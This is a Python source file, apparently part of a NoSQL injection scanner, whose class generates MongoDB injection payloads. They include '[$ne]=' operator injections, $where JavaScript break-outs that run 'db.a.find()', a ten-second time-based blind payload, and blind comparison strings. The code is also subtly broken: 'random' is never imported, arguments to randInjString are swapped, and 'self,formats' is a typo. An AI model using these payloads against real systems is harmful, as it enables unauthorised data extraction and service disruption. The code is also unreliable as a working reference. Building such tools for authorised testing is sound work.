import string
import itertools

def randInjString(formatString, size):
    
    if formatString == 1:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 2:
        chars = string.ascii_letters
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 3:
        chars = string.digits
        return ''.join(random.choice(chars) for x in range(size))
        
    elif formatString == 4:
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for x in range(size)) + '@' + ''.join(random.choice(chars) for x in range(size)) + '.com'

class InjectionStringCreator:

    leftPart = [
        "=a\';",
        "=a\";",
        "=1;"
        ]    

    rightPart = [
        "var d=\"a",
        "var d=\'a",
        "var d=1"
        ]

    formatAvailables=[1,2,3,4]

    standardSizes = [5,12,19,26,31]

    def __init__(self,size=standardSizes, formats=formatAvailables):
        self.sizes=size
        self.formats = formats

    def createIdString(self):
        for st in itertools.product(self.sizes, self.formats):
            yield "%s" %(randInjString(st[0], st[1]))

    def createNeqString(self):
        for st in itertools.product(self.sizes, self.formats):
            yield "%s%s" %("[$ne]=",randInjString(st[0], st[1]))

    def createWhereStrString(self):
        informations = [
            "return db.a.find();",
            "return db.a.findOne();",
        ]

        for st in itertools.product(self.leftPart, informations, self.rightPart):
            yield "%s%s%s" % (st[0],st[1],st[2])

    #def createWhereOneStrString():
    #    return "=1; return db.a.findOne(); var dummy='!"

    #def createWhereOneIntString():
    #    return "=a'; return db.a.findOne(); var dummy=1"

    def createTimeStrString(self):
        return "=a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy='!"

    def createTimeIntString(self):
        return "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1"

    def createBlindNeqString(self):
        informations = [
            "return this.a!='",
            "return this.a!=\"",
        ]

        for st in itertools.product(self.leftPart, informations, self.rightPart):
            for st2 in itertools.product(self.sizes, self,formats):
                yield "%s%s%s%s" %(st[0],st[1],randInjString(st2[0], st2[1]),st[2])

        #return "=a'; return this.a != '" + randInjString(size, formatStringString) + "'; var dummy='!"

#    def createThisNeqIntString(size, formatStringString):
#        return "=1; return this.a !=" + randInjString(size, formatStringString) + "; var dummy=1"
